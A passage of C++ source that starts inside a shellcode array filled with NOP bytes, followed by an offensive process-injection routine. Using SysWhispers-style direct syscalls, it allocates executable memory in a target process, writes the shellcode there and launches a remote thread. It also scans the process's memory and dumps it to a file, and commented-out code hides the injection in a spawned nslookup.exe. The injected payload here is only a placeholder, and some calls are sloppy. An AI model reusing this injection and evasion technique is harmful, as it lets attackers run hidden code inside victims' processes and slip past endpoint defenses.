0\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

                             //   // Create a 64-bit process: 
                             //   STARTUPINFO si;
                             //   PROCESS_INFORMATION pi;
                                LPVOID allocation_start;
                                SIZE_T allocation_size = sizeof(shellcode);
                             //   LPCWSTR cmd;
                             //   HANDLE hThread;
                             //   NTSTATUS status;

                             //   ZeroMemory(&si, sizeof(si));
                             //   ZeroMemory(&pi, sizeof(pi));
                             //   si.cb = sizeof(si);
                             //   cmd = TEXT("C:\\Windows\\System32\\nslookup.exe");

                             //   if (!CreateProcess(
                             //       cmd,							// Executable
                             //       NULL,							// Command line
                             //       NULL,							// Process handle not inheritable
                             //       NULL,							// Thread handle not inheritable
                             //       FALSE,							// Set handle inheritance to FALSE
                             //       CREATE_NO_WINDOW,	            // Do Not Open a Window
                             //       NULL,							// Use parent's environment block
                             //       NULL,							// Use parent's starting directory 
                             //       &si,			                // Pointer to STARTUPINFO structure
                             //       &pi								// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
                             //   )) {
                             //       DWORD errval = GetLastError();
                             //       std::cout << "FAILED" << errval << std::endl;
                             //   }
                             ////   WaitForSingleObject(pi.hProcess, 1000); // Allow nslookup 1 second to start/initialize. 

                                // Inject into the 64-bit process:
                                // SYSWHISPER LOW-LEVEL UNDOCUMENTED API:
                                allocation_start = nullptr;

                                NtAllocateVirtualMemory(hProcess, &allocation_start, 0, (PSIZE_T)&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                                NtWriteVirtualMemory(hProcess, allocation_start, shellcode, sizeof(shellcode), 0);
                                NtCreateThreadEx(&hProcess, GENERIC_EXECUTE, NULL, hProcess, allocation_start, allocation_start, FALSE, NULL, NULL, NULL, NULL);

                            }
                        //    Write_Once = Write_Once +1;
                      //  }
                       
                        // TESTING
                    }

                delete btDump;
            }

            lpStartAddr = reinterpret_cast<LPVOID>(reinterpret_cast<DWORD_PTR>(mbi.BaseAddress) + mbi.RegionSize);
        }
        if (!Found_String) {
            LogToConsole(_T("[!] String not found!\n"));
        }
    }
end:
    if (hFile && hFile != INVALID_HANDLE_VALUE)
        CloseHandle(hFile);
    if (hProcess)
    //    CloseHandle(hProcess);
    if (!bReturnValue && bFileCreated)
        DeleteFile(pwszDumpFilePath); // If the dump failed, delete the file

    return bReturnValue;
}
